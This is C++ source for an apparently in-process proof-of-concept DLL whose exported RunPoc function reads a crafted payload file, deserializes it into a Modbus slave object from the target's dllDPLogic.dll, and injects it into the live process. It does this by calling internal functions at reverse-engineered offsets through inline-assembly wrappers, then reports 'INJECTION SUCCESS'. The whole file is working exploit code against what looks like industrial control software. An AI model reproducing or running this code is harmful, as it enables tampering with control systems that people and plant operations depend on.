// #include <afx.h>
// #include <afxwin.h>

// class CModbusSlave : public CObject {
// public:
//     virtual void Serialize(CArchive& ar);
//     static CRuntimeClass* PASCAL GetThisClass();
// };

// extern "C" __declspec(dllexport) void RunPoc() {
//     AFX_MANAGE_STATE(AfxGetStaticModuleState());

//     // 1. 读取 Payload
//     CFile fLoad;
//     CFileException e;
//     if (!fLoad.Open(_T("C:\\payload.bin"), CFile::modeRead | CFile::typeBinary, &e)) {
//         ::MessageBox(NULL, _T("Payload not found"), 0, 0);
//         return;
//     }

//     HMODULE hLogic = GetModuleHandle(_T("dllDPLogic.dll"));
//     if (!hLogic) return;
//     typedef CRuntimeClass* (*FnGetClass)();
//     FnGetClass pfnGetClass = (FnGetClass)GetProcAddress(hLogic, "?GetThisClass@CModbusSlave@@SGPAUCRuntimeClass@@XZ");
//     if (!pfnGetClass) return;

//     CObject* pObj = pfnGetClass()->CreateObject();

//     // 2. Load (反序列化)
//     CArchive arLoad(&fLoad, CArchive::load);
//     try {
//         pObj->Serialize(arLoad);
//     }
//     catch(...) {
//         ::MessageBox(NULL, _T("Load Failed!"), _T("Error"), MB_OK);
//         delete pObj;
//         return;
//     }
//     arLoad.Close();
//     fLoad.Close();

//     // 3. Round-Trip Store (再次序列化到新文件)
//     CFile fStore;
//     if (fStore.Open(_T("C:\\roundtrip.bin"), CFile::modeCreate | CFile::modeWrite | CFile::typeBinary)) {
//         CArchive arStore(&fStore, CArchive::store);
//         try {
//             pObj->Serialize(arStore);
//             ::MessageBox(NULL, _T("Round-Trip Success!\nCheck C:\\roundtrip.bin"), _T("Victory"), MB_OK);
//         }
//         catch(...) {
//             ::MessageBox(NULL, _T("Round-Trip Store Failed"), _T("Error"), MB_OK);
//         }
//         arStore.Close();
//         fStore.Close();
//     }

//     delete pObj;
// }

#include <afx.h>
#include <afxwin.h>

// =============================================================
// 1. 函数地址常量 (基址偏移量)
// =============================================================
// 请确保这些偏移量是准确的 (IDA Address - 10000000)
static const uintptr_t kOffset_GetNewID = 0x471A0;
static const uintptr_t kOffset_Register = 0x1CF00;
static const uintptr_t kOffset_Notify   = 0x4A380;

// 存根类
class CModbusSlave : public CObject {
public:
    virtual void Serialize(CArchive& ar);
    static CRuntimeClass* PASCAL GetThisClass();
};

// =============================================================
// 2. 内联汇编包装器 (强制 __thiscall)
// =============================================================
// 这种写法能 100% 确保 ECX 寄存器被正确设置
// 同时也规避了编译器对函数指针类型的严格检查

__declspec(naked) void Call_GetNewID(void* fn, void* pThis, void* pSlave) {
    __asm {
        push ebp
        mov ebp, esp
        mov ecx, [ebp+12] ; pThis -> ECX
        push [ebp+16]     ; pSlave -> Stack
        call [ebp+8]      ; Call fn
        pop ebp
        ret
    }
}

__declspec(naked) void** Call_Register(void* fn, void* pThis, int id) {
    __asm {
        push ebp
        mov ebp, esp
        mov ecx, [ebp+12] ; pThis -> ECX
        push [ebp+16]     ; id -> Stack
        call [ebp+8]      ; Call fn (Returns EAX)
        pop ebp
        ret
    }
}

__declspec(naked) void Call_Notify(void* fn, void* pThis, int* pIdPtr) {
    __asm {
        push ebp
        mov ebp, esp
        mov ecx, [ebp+12] ; pThis -> ECX
        push [ebp+16]     ; pIdPtr -> Stack
        call [ebp+8]      ; Call fn
        pop ebp
        ret
    }
}

// =============================================================
// 3. 主逻辑
// =============================================================
extern "C" __declspec(dllexport) void RunPoc() {
    AFX_MANAGE_STATE(AfxGetStaticModuleState());

    // 🔴 填入你在 CE 里搜到的地址
    void* pContainer = (void*)0x124C23E8; 

    if (IsBadReadPtr(pContainer, 4)) {
        ::MessageBox(NULL, _T("Container Address Invalid!"), _T("Stop"), MB_OK);
        return;
    }

    HMODULE hLogic = GetModuleHandle(_T("dllDPLogic.dll"));
    if (!hLogic) return;
    DWORD_PTR base = (DWORD_PTR)hLogic;

    // 计算真实函数地址
    void* fnGetNewID = (void*)(base + kOffset_GetNewID);
    void* fnRegister = (void*)(base + kOffset_Register);
    void* fnNotify   = (void*)(base + kOffset_Notify);

    // Load Payload
    CFile f;
    if (!f.Open(_T("C:\\payload.bin"), CFile::modeRead | CFile::typeBinary)) return;
    ULONGLONG len = f.GetLength();
    BYTE* buf = new BYTE[(size_t)len];
    f.Read(buf, (UINT)len);
    f.Close();
    CMemFile mem(buf, (UINT)len);
    CArchive ar(&mem, CArchive::load);

    typedef CRuntimeClass* (*FnGetClass)();
    FnGetClass pfnGetClass = (FnGetClass)GetProcAddress(hLogic, "?GetThisClass@CModbusSlave@@SGPAUCRuntimeClass@@XZ");
    CObject* pSlave = pfnGetClass()->CreateObject();
    
    try { pSlave->Serialize(ar); } 
    catch(...) { delete pSlave; delete[] buf; return; }
    ar.Close(); delete[] buf;

    // 执行挂载
    try {
        // Step A: GetNewID
        // 假设 this 指针就是 pContainer
        Call_GetNewID(fnGetNewID, pContainer, pSlave);

        // Step B: Get ID
        int id = *((int*)((char*)pSlave + 24));
        
        // Step C: Register
        // 假设 Register 的 this 也是 pContainer
        // 如果这里崩了，说明 Register 需要的是 pContainer + Offset
        void** pSlot = Call_Register(fnRegister, pContainer, id);
        
        if (pSlot) {
            *pSlot = pSlave;
        } else {
            ::MessageBox(NULL, _T("Register returned NULL"), 0, 0);
            return;
        }

        // Step D: Notify
        // 假设 Notify 的 this 也是 pContainer
        Call_Notify(fnNotify, pContainer, &id);

        ::MessageBox(NULL, _T("✅ INJECTION SUCCESS!"), _T("Victory"), MB_OK);
    }
    catch (...) {
        ::MessageBox(NULL, _T("Crash! Possible reasons:\n1. 'this' pointer offset mismatch.\n2. Function address wrong."), _T("Error"), MB_OK);
    }
}